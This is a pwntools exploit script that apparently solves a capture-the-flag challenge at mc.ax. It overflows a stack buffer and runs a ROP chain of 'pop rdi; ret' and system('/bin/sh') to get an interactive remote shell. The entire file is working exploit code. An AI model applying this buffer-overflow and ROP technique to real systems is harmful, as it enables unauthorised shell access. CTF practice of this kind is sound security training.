from pwn import *

#Settings
filename = "./beginner-generic-pwn-number-0"
remoteOn = True
junk = b"A"*56
def start(elf, ssh=False, libc=None):
    if remoteOn:
        if ssh:
            s = ssh(host="", user="", password="")
            return [s.process(), libc]
        else:
            return [remote("mc.ax", 31199), libc]
    else:
        return [elf.process(), '/lib/x86_64-linux-gnu/libc.so.6']


#Start the processes.
elf = ELF(filename)
r = start(elf)[0]
if start(elf)[1] is not None:
    libc = ELF(start(elf)[1])
rop = ROP(elf)

#Base gadgets
ret_addr = (rop.find_gadget(['ret']))[0] # Base return address
pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0] # pop rdi; ret
log.info(f"pop rdi @ {hex(pop_rdi)}")
log.info(f"return address @ {hex(ret_addr)}")

system = elf.sym["system"]
binsh = 0x4031e8
log.info(f"system @ {hex(system)}")
log.info(f"/bin/sh @ {hex(binsh)}")

payload = junk
payload += p64(ret_addr)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)
r.sendline(payload)
r.interactive()
